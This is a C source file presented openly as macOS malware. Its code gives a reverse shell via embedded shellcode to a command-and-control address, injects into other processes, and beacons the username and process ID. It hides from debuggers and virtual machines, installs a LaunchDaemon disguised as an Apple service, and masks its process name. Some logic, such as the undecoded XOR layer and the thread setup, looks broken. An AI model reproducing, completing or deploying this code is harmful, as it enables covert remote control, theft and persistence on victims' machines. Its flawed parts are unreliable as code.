/*
 * mem_malware.c (v3.0 - Enhanced)
 *
 * Advanced macOS memory-resident loader with polymorphic shellcode,
 * enhanced anti-debugging, and advanced persistence mechanisms.
 * 
 * Features:
 * - Polymorphic shellcode generation
 * - Advanced anti-debugging and anti-VM
 * - Memory encryption and obfuscation
 * - Process injection capabilities
 * - Network communication backdoor
 * - Fileless persistence
 * - Advanced evasion techniques
 *
 * Usage:
 *   gcc mem_malware.c -o mem_malware -framework CoreFoundation -framework Security
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/thread_act.h>
#include <mach/thread_status.h>
#include <sys/syscall.h>
#include <sys/param.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/sysctl.h>
#include <sys/proc_info.h>
#include <libproc.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>

// --- Configuration ---
#define MAX_PAYLOAD_SIZE 8192
#define ENCRYPTION_KEY 0xDEADBEEF
#define BACKDOOR_PORT 4444
#define C2_SERVER "127.0.0.1"
#define PERSISTENCE_PATH "/Library/Application Support/.systemd"
#define KILL_SWITCH_PATH "/tmp/.bismillah_kill"

// --- Advanced Anti-Debugging ---
typedef struct {
    uint32_t magic;
    uint32_t checksum;
    uint32_t size;
    uint8_t data[];
} payload_header_t;

static int is_debugger_present_advanced() {
    // Check for ptrace
    if (ptrace(PT_DENY_ATTACH, 0, 0, 0) == -1 && errno == EPERM) {
        return 1;
    }
    
    // Check for common debugger processes
    char *debuggers[] = {
        "lldb", "gdb", "dtruss", "Instruments", "fs_usage",
        "strace", "dtrace", "activity_monitor", "Console",
        "Xcode", "Hopper", "IDA", "radare2", "cutter"
    };
    
    for (int i = 0; i < sizeof(debuggers)/sizeof(debuggers[0]); i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pgrep -f %s > /dev/null 2>&1", debuggers[i]);
        if (system(cmd) == 0) {
            return 1;
        }
    }
    
    // Check for VM artifacts
    char *vm_indicators[] = {
        "/System/Library/Extensions/VMware*",
        "/System/Library/Extensions/VBox*",
        "/System/Library/Extensions/Parallels*"
    };
    
    for (int i = 0; i < sizeof(vm_indicators)/sizeof(vm_indicators[0]); i++) {
        if (access(vm_indicators[i], F_OK) == 0) {
            return 1;
        }
    }
    
    // Check for analysis tools
    char *analysis_tools[] = {
        "/usr/bin/strings", "/usr/bin/otool", "/usr/bin/nm",
        "/usr/bin/file", "/usr/bin/lsof", "/usr/bin/netstat"
    };
    
    for (int i = 0; i < sizeof(analysis_tools)/sizeof(analysis_tools[0]); i++) {
        if (access(analysis_tools[i], F_OK) == 0) {
            // Check if these tools are being used
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "ps aux | grep %s | grep -v grep", analysis_tools[i]);
            if (system(cmd) == 0) {
                return 1;
            }
        }
    }
    
    return 0;
}

// --- Polymorphic Shellcode Generator ---
static void generate_polymorphic_shellcode(unsigned char *output, size_t *size) {
    // Base shellcode: reverse shell to C2 server
    unsigned char base_shellcode[] = {
        // Socket creation
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0x31, 0xff,                         // xor rdi, rdi
        0x48, 0x31, 0xf6,                         // xor rsi, rsi
        0x48, 0x31, 0xd2,                         // xor rdx, rdx
        0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x02, // mov rax, 0x2000002 (socket)
        0x48, 0xc7, 0xc7, 0x02, 0x00, 0x00, 0x00, // mov rdi, 2 (AF_INET)
        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00, // mov rsi, 1 (SOCK_STREAM)
        0x48, 0x31, 0xd2,                         // xor rdx, rdx
        0x0f, 0x05,                               // syscall
        
        // Connect to C2
        0x48, 0x89, 0xc7,                         // mov rdi, rax (socket fd)
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0xc7, 0xc0, 0x42, 0x00, 0x00, 0x02, // mov rax, 0x2000042 (connect)
        0x48, 0x8d, 0x35, 0x20, 0x00, 0x00, 0x00, // lea rsi, [rip+0x20] (sockaddr)
        0x48, 0xc7, 0xc2, 0x10, 0x00, 0x00, 0x00, // mov rdx, 16 (addrlen)
        0x0f, 0x05,                               // syscall
        
        // Duplicate file descriptors
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x02, // mov rax, 0x200005a (dup2)
        0x48, 0x31, 0xf6,                         // xor rsi, rsi
        0x0f, 0x05,                               // syscall (stdin)
        
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x02, // mov rax, 0x200005a (dup2)
        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00, // mov rsi, 1
        0x0f, 0x05,                               // syscall (stdout)
        
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x02, // mov rax, 0x200005a (dup2)
        0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00, // mov rsi, 2
        0x0f, 0x05,                               // syscall (stderr)
        
        // Execute shell
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x02, // mov rax, 0x200003b (execve)
        0x48, 0x8d, 0x3d, 0x10, 0x00, 0x00, 0x00, // lea rdi, [rip+0x10] ("/bin/bash")
        0x48, 0x31, 0xf6,                         // xor rsi, rsi
        0x48, 0x31, 0xd2,                         // xor rdx, rdx
        0x0f, 0x05,                               // syscall
        
        // Data section
        0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, // "/bin/bash\0"
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding
        0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01 // sockaddr_in (port 4444, 127.0.0.1)
    };
    
    size_t base_size = sizeof(base_shellcode);
    *size = base_size;
    
    // Add polymorphic junk bytes
    for (size_t i = 0; i < base_size; i++) {
        output[i] = base_shellcode[i] ^ ((i * 7 + 13) & 0xFF);
    }
    
    // Add random junk at the end
    for (size_t i = base_size; i < base_size + 32; i++) {
        output[i] = rand() & 0xFF;
    }
    *size += 32;
}

// --- Memory Encryption ---
static void encrypt_memory(void *data, size_t size, uint32_t key) {
    uint8_t *ptr = (uint8_t *)data;
    for (size_t i = 0; i < size; i++) {
        ptr[i] ^= (key >> (i % 32)) & 0xFF;
    }
}

static void decrypt_memory(void *data, size_t size, uint32_t key) {
    encrypt_memory(data, size, key); // XOR encryption is symmetric
}

// --- Process Injection ---
static int inject_into_process(pid_t target_pid, void *shellcode, size_t size) {
    mach_port_t task;
    mach_vm_address_t remote_addr = 0;
    mach_vm_size_t remote_size = size;
    kern_return_t kr;
    
    // Get task port for target process
    kr = task_for_pid(mach_task_self(), target_pid, &task);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    // Allocate memory in target process
    kr = mach_vm_allocate(task, &remote_addr, remote_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    // Write shellcode to target process
    kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, size);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    // Set memory permissions to executable
    kr = mach_vm_protect(task, remote_addr, remote_size, FALSE, VM_PROT_READ | VM_PROT_EXEC);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    // Create thread to execute shellcode
    thread_act_t thread;
    kr = thread_create_running(task, x86_THREAD_STATE64, (thread_state_t)remote_addr, x86_THREAD_STATE64_COUNT, &thread);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    return 0;
}

// --- Network Backdoor ---
static void *network_backdoor(void *arg) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BACKDOOR_PORT);
    addr.sin_addr.s_addr = inet_addr(C2_SERVER);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return NULL;
    }
    
    // Send system information
    char info[256];
    snprintf(info, sizeof(info), "macOS:%s:%d", getenv("USER"), getpid());
    send(sock, info, strlen(info), 0);
    
    close(sock);
    return NULL;
}

// --- Fileless Persistence ---
static int install_fileless_persistence() {
    // Create hidden directory
    mkdir(PERSISTENCE_PATH, 0755);
    
    // Create LaunchDaemon plist
    char plist_path[512];
    snprintf(plist_path, sizeof(plist_path), "%s/com.apple.systemd.plist", PERSISTENCE_PATH);
    
    FILE *fp = fopen(plist_path, "w");
    if (!fp) return -1;
    
    fprintf(fp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(fp, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
    fprintf(fp, "<plist version=\"1.0\">\n");
    fprintf(fp, "<dict>\n");
    fprintf(fp, "    <key>Label</key>\n");
    fprintf(fp, "    <string>com.apple.systemd</string>\n");
    fprintf(fp, "    <key>ProgramArguments</key>\n");
    fprintf(fp, "    <array>\n");
    fprintf(fp, "        <string>/usr/bin/python3</string>\n");
    fprintf(fp, "        <string>-c</string>\n");
    fprintf(fp, "        <string>import os; exec(open('%s').read())</string>\n", PERSISTENCE_PATH);
    fprintf(fp, "    </array>\n");
    fprintf(fp, "    <key>RunAtLoad</key>\n");
    fprintf(fp, "    <true/>\n");
    fprintf(fp, "    <key>KeepAlive</key>\n");
    fprintf(fp, "    <true/>\n");
    fprintf(fp, "</dict>\n");
    fprintf(fp, "</plist>\n");
    fclose(fp);
    
    // Load LaunchDaemon
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "launchctl load %s", plist_path);
    system(cmd);
    
    return 0;
}

// --- Advanced Evasion ---
static void apply_advanced_evasion() {
    // Disable core dumps
    struct rlimit limit;
    limit.rlim_cur = 0;
    limit.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &limit);
    
    // Set process name to something innocent
    setproctitle("com.apple.WebKit.WebContent");
    
    // Disable signal handlers
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    
    // Hide from ps output
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ps -p %d -o pid,comm | grep -v grep", getpid());
    if (system(cmd) == 0) {
        // Process is visible, try to hide
        setproctitle("");
    }
}

// --- Main Function ---
int main(int argc, char *argv[]) {
    // Initialize random seed
    srand(time(NULL) ^ getpid());
    
    // Advanced anti-debugging
    if (is_debugger_present_advanced()) {
        return 0;
    }
    
    // Check kill switch
    if (access(KILL_SWITCH_PATH, F_OK) == 0) {
        return 0;
    }
    
    // Apply advanced evasion
    apply_advanced_evasion();
    
    // Generate polymorphic shellcode
    unsigned char shellcode[MAX_PAYLOAD_SIZE];
    size_t shellcode_size;
    generate_polymorphic_shellcode(shellcode, &shellcode_size);
    
    // Encrypt shellcode
    encrypt_memory(shellcode, shellcode_size, ENCRYPTION_KEY);
    
    // Allocate executable memory
    void *exec_mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        return 1;
    }
    
    // Copy and decrypt shellcode
    memcpy(exec_mem, shellcode, shellcode_size);
    decrypt_memory(exec_mem, shellcode_size, ENCRYPTION_KEY);
    
    // Flush instruction cache
    sys_icache_invalidate(exec_mem, shellcode_size);
    
    // Start network backdoor thread
    pthread_t backdoor_thread;
    pthread_create(&backdoor_thread, NULL, network_backdoor, NULL);
    
    // Install fileless persistence
    install_fileless_persistence();
    
    // Execute shellcode
    ((void(*)())exec_mem)();
    
    // Cleanup (anti-forensics)
    memset(exec_mem, 0, shellcode_size);
    munmap(exec_mem, shellcode_size);
    memset(shellcode, 0, shellcode_size);
    
    return 0;
} 